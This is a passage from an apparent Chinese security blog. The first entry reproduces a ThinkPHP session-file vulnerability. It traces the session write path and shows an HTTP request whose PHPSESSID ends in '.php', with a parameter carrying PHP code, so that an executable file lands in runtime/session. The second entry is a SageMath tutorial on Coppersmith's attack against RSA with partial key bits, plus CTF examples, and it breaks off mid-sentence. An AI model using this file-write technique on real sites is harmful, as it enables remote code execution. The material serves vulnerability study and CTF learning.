<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handler</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token variable">$sessionId</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">init</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> string    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>继续跟进，在<code>write()</code>函数中，<code>$filename</code>是通过<code>$this-&gt;getFileName()</code>函数赋值的，格式为<strong>文件路径+”sess_”+之前的sessionId</strong>，然后判断是否需要对session数据进行压缩，默认是不需要的，再执行<code>writeFile()</code>函数，将session内容写入文件</p><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//</span><span class="token keyword">class</span> <span class="token class-name">File</span> <span class="token keyword">implements</span> <span class="token class-name">SessionHandlerInterface</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span>string <span class="token variable">$sessID</span><span class="token punctuation">,</span> string <span class="token variable">$sessData</span><span class="token punctuation">)</span><span class="token punctuation">:</span> bool    <span class="token punctuation">{</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getFileName</span><span class="token punctuation">(</span><span class="token variable">$sessID</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$data</span>     <span class="token operator">=</span> <span class="token variable">$sessData</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string">'data_compress'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string">'gzcompress'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//数据压缩</span>            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">gzcompress</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">getFileName</span><span class="token punctuation">(</span>string <span class="token variable">$name</span><span class="token punctuation">,</span> bool <span class="token variable">$auto</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">:</span> string    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string">'prefix'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 使用子目录</span>            <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string">'prefix'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token constant">DIRECTORY_SEPARATOR</span> <span class="token punctuation">.</span> <span class="token string">'sess_'</span> <span class="token punctuation">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">'sess_'</span> <span class="token punctuation">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string">'path'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$dir</span>      <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$auto</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">,</span> <span class="token number">0755</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token punctuation">\</span>Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 创建失败</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">:</span> bool    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>bool<span class="token punctuation">)</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token constant">LOCK_EX</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在index控制器中添加如下action</p><pre class=" language-php"><code class="language-php"><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Session</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span>Request <span class="token variable">$request</span><span class="token punctuation">,</span>Session <span class="token variable">$session</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$test</span><span class="token operator">=</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">param</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$session</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//session('test', $test);</span>    <span class="token keyword">return</span> <span class="token variable">$session</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>think\facade\Session</strong>类可以使用静态方法调用 <strong>Session::get(‘test’)</strong> 和 <strong>Session::set(‘test’, $test)</strong> </p><p>访问<code>http://localhost/tp/public/?test=&lt;?php phpinfo();?&gt;</code></p><pre><code>GET /tp/public/?test=1 HTTP/1.1Cookie: PHPSESSID=aaaaaaaaaaaaaaaaaaaaaaaaaaaa.phpConnection: close</code></pre><p>会在<code>./runtime/session/</code>文件夹下，生成<code>sess_aaaaaaaaaaaaaaaaaaaaaaaaaaaa.php</code>文件包含<code>&lt;?php phpinfo();?&gt;</code>内容</p><p>再访问<code>http://localhost/tp/runtime/session/sess_aaaaaaaaaaaaaaaaaaaaaaaaaaaa.php</code></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> thinkphp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Coppersmith&#39;s Attack</title>
      <link href="/2019/12/08/crypto/coppersmith-s-attack/"/>
      <url>/2019/12/08/crypto/coppersmith-s-attack/</url>
      
        <content type="html"><![CDATA[<h2 id="使用SageMath尝试Coppersmith’s-Attack"><a href="#使用SageMath尝试Coppersmith’s-Attack" class="headerlink" title="使用SageMath尝试Coppersmith’s Attack"></a>使用SageMath尝试Coppersmith’s Attack</h2><p>Sage的small_root方法</p><pre class=" language-python"><code class="language-python">N <span class="token operator">=</span> <span class="token number">10001</span>K <span class="token operator">=</span> Zmod<span class="token punctuation">(</span><span class="token number">10001</span><span class="token punctuation">)</span>P<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>K<span class="token punctuation">)</span>f <span class="token operator">=</span> x<span class="token operator">^</span><span class="token number">3</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">2</span> <span class="token operator">+</span> <span class="token number">5000</span><span class="token operator">*</span>x <span class="token operator">-</span> <span class="token number">222</span><span class="token keyword">print</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span></code></pre><p><a href="http://sage-doc.sis.uta.fi/reference/polynomial_rings/sage/rings/polynomial/polynomial_modn_dense_ntl.html#sage.rings.polynomial.polynomial_modn_dense_ntl.small_roots" target="_blank" rel="noopener">http://sage-doc.sis.uta.fi/reference/polynomial_rings/sage/rings/polynomial/polynomial_modn_dense_ntl.html#sage.rings.polynomial.polynomial_modn_dense_ntl.small_roots</a></p><h3 id="p的高位或低位已知时"><a href="#p的高位或低位已知时" class="headerlink" title="p的高位或低位已知时"></a>p的高位或低位已知时</h3><p>Sage的small_root方法<code>b &gt;= N^β</code>可以找到以N的除数b为模的解。在此，模数为N的解就是<code>β = 1</code>这种情况。 考虑到公钥n是RSA中相同位数的p和q的乘积，可以通过设置<code>β = x</code>度数来求<code>b = p or q</code>模解,满足<code>n ^ x &lt; p</code>，暂设<code>x=0.3</code>。</p><p>已知p的高位是n的位数的1/4，即p的位数的约1/2时，将其余位设置为0, 设为<code>pbar</code>。</p><p>此时<code>f(x) = x + pbar = 0 (mod b)</code>，可以通过求出满足的f（x）的值x0,即<code>p = x0 + pbar</code>。</p><pre class=" language-python"><code class="language-python">p <span class="token operator">=</span> <span class="token number">0x00f23799c031b942026e420769b74d22fa2114428189139c43c366c6ab8367c6b3d6f821449aafb2058b0e6ed964fa0ad45fb306f96376e80823a72b58101919e50acad3b5e6d079e7ff9218ed6df6edbef536742714ce88b2e717f45af53ef0d04c89faf01c80b28e764973aba27726c85c0236e8756a865c03577722bac5e391</span>q <span class="token operator">=</span> <span class="token number">0x00c9d24330fa4945cfe1e5d6912d6bde0231035a1cc8d8ae67d949347b895f8d579bce2adaf37c568957b17a6564dbf80d36d81e4622ab30e02132b0155aefbd3912a27c625a9b7b05bc72217039f5aa88c20cbf9871c3228e9d80d9106f94b11c1f50c40c96862b5cd6b6f781883dd2eff80a059d3ca027af6a03edeb34a7390f</span>n <span class="token operator">=</span> p<span class="token operator">*</span>qbeta <span class="token operator">=</span> <span class="token number">0.5</span>epsilon <span class="token operator">=</span> beta<span class="token operator">^</span><span class="token number">2</span><span class="token operator">/</span><span class="token number">7</span>pbits <span class="token operator">=</span> p<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span>kbits <span class="token operator">=</span> floor<span class="token punctuation">(</span>n<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>beta<span class="token operator">^</span><span class="token number">2</span><span class="token operator">-</span>epsilon<span class="token punctuation">)</span><span class="token punctuation">)</span>pbar <span class="token operator">=</span> p <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span>pbits<span class="token number">-2</span><span class="token operator">^</span>kbits<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"upper %d bits (of %d bits) is given"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>pbits<span class="token operator">-</span>kbits<span class="token punctuation">,</span> pbits<span class="token punctuation">)</span>PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> x <span class="token operator">+</span> pbar<span class="token keyword">print</span> px0 <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true"># find root &lt; 2^kbits with factor >= n^0.3</span><span class="token keyword">print</span> x0 <span class="token operator">+</span> pbar</code></pre><p>运行结果：upper 586 bits (of 1024 bits) is given</p><p><code>beta</code>和<code>X</code>参数的作用是缩小范围，限制了<code>n ^ 0.3 &lt; p</code>和<code>x0 &lt; 2 ^ kbits</code></p><p>即使知道了低位而不是高位，也可以通过使用<a href="http://d.hatena.ne.jp/keyword/%C2%BF%B9%E0%BC%B0" target="_blank" rel="noopener">多项式</a>来恢复p的值。</p><h3 id="当秘密密钥d的低位已知时"><a href="#当秘密密钥d的低位已知时" class="headerlink" title="当秘密密钥d的低位已知时"></a>当秘密密钥d的低位已知时</h3><p>若e较小，对于秘密密钥d，如果已知低位，大约是n位的1/4，则可以恢复d的值。称为部分密钥暴露攻击。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">partial_p</span><span class="token punctuation">(</span>p0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    nbits <span class="token operator">=</span> n<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span>    f <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">^</span>kbits<span class="token operator">*</span>x <span class="token operator">+</span> p0    f <span class="token operator">=</span> f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>    roots <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span><span class="token punctuation">(</span>nbits<span class="token operator">//</span><span class="token number">2</span><span class="token operator">-</span>kbits<span class="token punctuation">)</span><span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.3</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># find root &lt; 2^(nbits//2-kbits) with factor >= n^0.3</span>    <span class="token keyword">if</span> roots<span class="token punctuation">:</span>        x0 <span class="token operator">=</span> roots<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        p <span class="token operator">=</span> gcd<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token operator">*</span>x0 <span class="token operator">+</span> p0<span class="token punctuation">,</span> n<span class="token punctuation">)</span>        <span class="token keyword">return</span> ZZ<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">find_p</span><span class="token punctuation">(</span>d0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    X <span class="token operator">=</span> var<span class="token punctuation">(</span><span class="token string">'X'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> e<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        results <span class="token operator">=</span> solve_mod<span class="token punctuation">(</span><span class="token punctuation">[</span>e<span class="token operator">*</span>d0<span class="token operator">*</span>X <span class="token operator">-</span> k<span class="token operator">*</span>X<span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token operator">-</span>X<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> k<span class="token operator">*</span>n <span class="token operator">==</span> X<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">)</span>        <span class="token keyword">for</span> x <span class="token keyword">in</span> results<span class="token punctuation">:</span>            p0 <span class="token operator">=</span> ZZ<span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            p <span class="token operator">=</span> partial_p<span class="token punctuation">(</span>p0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> n<span class="token punctuation">)</span>            <span class="token keyword">if</span> p<span class="token punctuation">:</span>                <span class="token keyword">return</span> p<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> <span class="token number">0x00bef498e6eb2cffe71312da47ab89d2c47db7438ea2cfa992ddddbc2a01978001fc51e286e6ebf028396cdb8b3323c60e6b9d50cd84187cf7f48e3875a2f0890f70b02333ad89db2923863ce146562286f63fb0a1d0198e3a6862ba5ac12e85a5c6d0d27cb1c81bdf69cc5bc95b8001a2f744517f9437b4ddd5a076fc0e9a5de1a7a268c40f31aa29e8dc27c0b3a182299ca7a9335b4bd4585452f6107c238e486c98dd73a5f9862e9e80b152f53381c72f897107551c281259ac3ee32c4b4f46cc03127d1bf699acd0266f3c6729253c70da0c69b1560fa172735709866b375b6eba294e1ce8b46fba798ba380080b4bf9603998cac199d9cd46e30ae8da9e7f</span>    e <span class="token operator">=</span> <span class="token number">3</span>    d <span class="token operator">=</span> <span class="token number">0x7f4dbb449cc8aa9a0cb73c2fc7b1372da924d7b46c8a710c93e9281c010faaabfd8bec59ef47f5702648925cccc284099d138b33ad65a8a54db425a3c1f5b0b4f5cac22273b13cc617aed340d98ec1af4ed5206be011097c459726e72b7459192f35e1a8768567ea46883d30e7aaabc1fa2d8baa62cfcde93915a4a809bc3e9547bb07e1ecca16e51078312e89f0561e31b55db8b0ea5bc87a6ca7464a3d7c28a68c60e2ba88fe6a7d2b300d723e549910a987da89fc0a1c0de197a3d62c501b1f0e819891b1c32a0d6c233f2a285df87bb9e5c6c72d983ff3e706696bba639f573f9c3646968f02f3a615a438e20bb7c38d53621079f2899547a95350f3abeb</span>    beta <span class="token operator">=</span> <span class="token number">0.5</span>    epsilon <span class="token operator">=</span> beta<span class="token operator">^</span><span class="token number">2</span><span class="token operator">/</span><span class="token number">7</span>    nbits <span class="token operator">=</span> n<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span>    kbits <span class="token operator">=</span> floor<span class="token punctuation">(</span>nbits<span class="token operator">*</span><span class="token punctuation">(</span>beta<span class="token operator">^</span><span class="token number">2</span><span class="token operator">+</span>epsilon<span class="token punctuation">)</span><span class="token punctuation">)</span>    d0 <span class="token operator">=</span> d <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token number">-1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"lower %d bits (of %d bits) is given"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>kbits<span class="token punctuation">,</span> nbits<span class="token punctuation">)</span>    p <span class="token operator">=</span> find_p<span class="token punctuation">(</span>d0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"found p: %d"</span> <span class="token operator">%</span> p    q <span class="token operator">=</span> n<span class="token operator">//</span>p    <span class="token keyword">print</span> d    <span class="token keyword">print</span> inverse_mod<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>运行结果：lower 585 bits (of 2048 bits) is given</p><h3 id="当知道明文m的高位或低位时"><a href="#当知道明文m的高位或低位时" class="headerlink" title="当知道明文m的高位或低位时"></a>当知道明文m的高位或低位时</h3><p>若e较小，当已知明文m的高位<strong>约</strong>为n位数的（1-1 / e）时，其余位设置为0，设为 <code>mbar</code>。当对应的密文为c时，<code>f(x) = (mbar + x)^e - c (mod n)</code>可以通过获得以下公式的解来获得满足此要求的f（x）的值，即m。这<code>b = n</code>是因为是这种情况<code>β = 1</code>。</p><pre class=" language-python"><code class="language-python">n <span class="token operator">=</span> <span class="token number">0x00bef498e6eb2cffe71312da47ab89d2c47db7438ea2cfa992ddddbc2a01978001fc51e286e6ebf028396cdb8b3323c60e6b9d50cd84187cf7f48e3875a2f0890f70b02333ad89db2923863ce146562286f63fb0a1d0198e3a6862ba5ac12e85a5c6d0d27cb1c81bdf69cc5bc95b8001a2f744517f9437b4ddd5a076fc0e9a5de1a7a268c40f31aa29e8dc27c0b3a182299ca7a9335b4bd4585452f6107c238e486c98dd73a5f9862e9e80b152f53381c72f897107551c281259ac3ee32c4b4f46cc03127d1bf699acd0266f3c6729253c70da0c69b1560fa172735709866b375b6eba294e1ce8b46fba798ba380080b4bf9603998cac199d9cd46e30ae8da9e7f</span>e <span class="token operator">=</span> <span class="token number">3</span>m <span class="token operator">=</span> randrange<span class="token punctuation">(</span>n<span class="token punctuation">)</span>c <span class="token operator">=</span> pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>beta <span class="token operator">=</span> <span class="token number">1</span>epsilon <span class="token operator">=</span> beta<span class="token operator">^</span><span class="token number">2</span><span class="token operator">/</span><span class="token number">7</span>nbits <span class="token operator">=</span> n<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span>kbits <span class="token operator">=</span> floor<span class="token punctuation">(</span>nbits<span class="token operator">*</span><span class="token punctuation">(</span>beta<span class="token operator">^</span><span class="token number">2</span><span class="token operator">/</span>e<span class="token operator">-</span>epsilon<span class="token punctuation">)</span><span class="token punctuation">)</span>mbar <span class="token operator">=</span> m <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span>nbits<span class="token number">-2</span><span class="token operator">^</span>kbits<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"upper %d bits (of %d bits) is given"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>nbits<span class="token operator">-</span>kbits<span class="token punctuation">,</span> nbits<span class="token punctuation">)</span>PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token punctuation">(</span>mbar <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token operator">^</span>e <span class="token operator">-</span> c<span class="token keyword">print</span> mx0 <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true"># find root &lt; 2^kbits with factor = n</span><span class="token keyword">print</span> mbar <span class="token operator">+</span> x0</code></pre><p>运行结果：upper 1658 bits (of 2048 bits) is given</p><p>这个例子中 e=3，公式<code>kbits = floor(nbits*x)</code>其中x最大不超过0.25 至少要已知1536个字符</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="广外rsa2"><a href="#广外rsa2" class="headerlink" title="广外rsa2"></a>广外rsa2</h3><p>已知n，p的高位576位，要求出完整的p</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> sage<span class="token punctuation">.</span>all <span class="token keyword">import</span> <span class="token operator">*</span>n <span class="token operator">=</span> 0xeb4f8c45336c229371fd73a252b24dd3bf8b3cdc1bb1864f140fd63c88d47c44ba228bebe223fe53c7eaf88678b780821a6660b2726506216554990a5dda178ee04a47c7f1974fc8f8268d081bbb2be7e7353ccf36fecfce5f5f82722d064928f2d60844373c52b4d1db9dc41f7f16807c5b4356c4d2290811e25c51ef1227aa6e893d37dd8743e391fa638d77d0c55e4fb331576602128333d4be95f06523521e7511b39fc20111c88f2635b67e3531684d58ea6574179b5e63a862d073241f5ff91c97a45aa3d8e3287d8161a97728d2e19d72669f39f9e6ad10677bb563bdef30d0dcfa719c2f1836bd02b73d21dbecc11717b54c45d415d3f423ce6dfd8dLp2 <span class="token operator">=</span>0xfb2151c701f7667b53822fe625b95edee00c3a947b234eca47903ef62fb128d813a9c1acb328f3f7181d24ce31814cd1a69ac4b61b269e2b0eb7fbaabe9633d33a36d0715b4cd386Le <span class="token operator">=</span> <span class="token number">0x10001</span>pbits <span class="token operator">=</span> <span class="token number">1024</span>kbits <span class="token operator">=</span> <span class="token number">448</span>p2 <span class="token operator">=</span> p2 <span class="token operator">&lt;&lt;</span> kbitsPR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> x <span class="token operator">+</span> p2roots <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">)</span><span class="token keyword">if</span> roots<span class="token punctuation">:</span>            p <span class="token operator">=</span> p2<span class="token operator">+</span>int<span class="token punctuation">(</span>roots<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>     <span class="token keyword">print</span> <span class="token string">"n: "</span><span class="token punctuation">,</span> n       <span class="token keyword">print</span> <span class="token string">"p: "</span><span class="token punctuation">,</span> p    <span class="token keyword">print</span> <span class="token string">"q: "</span><span class="token punctuation">,</span> n<span class="token operator">/</span>p</code></pre><p>如果已知位数不足576位，可以爆破所缺位的二进制，达到576位了再用算法恢复完整的p</p><h3 id="高校运维"><a href="#高校运维" class="headerlink" title="高校运维"></a>高校运维</h3><p>题目给了enc,n,e</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flag <span class="token keyword">import</span> FLAG<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> os<span class="token keyword">import</span> gmpy2p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span>q <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>bytes_to_long<span class="token punctuation">(</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p<span class="token operator">*</span>qe <span class="token operator">=</span> <span class="token number">65537</span>m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>FLAG<span class="token punctuation">)</span>enc <span class="token operator">=</span> pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"enc"</span><span class="token punctuation">,</span><span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>str<span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>str<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span></code></pre><p>爆破减去 next_prime的产生的偏移，os.urandom(32)得到的32字节是mod 